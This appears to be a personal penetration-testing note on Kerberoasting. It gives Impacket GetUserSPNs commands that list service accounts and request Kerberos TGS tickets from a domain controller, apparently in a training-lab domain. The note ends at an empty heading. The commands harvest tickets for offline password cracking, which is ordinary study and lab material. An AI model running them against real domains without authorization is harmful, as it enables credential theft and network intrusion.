---
type: tool
category: AD
tags:
  - tool
---
# Overview
We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket.

## Commands

### Kerboroasting - GetUserSPNs
> [!INFO] Note
> If we perform this across a forest trust, we can specify the target domain with `-target-domain FQDN`!

#### Listing SPN Accounts
```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

#### Request all TGS Tickets
```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile all-tickets
```

#### Request a Single TGS ticket
```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile tgs-USER
```


## Important Parameter
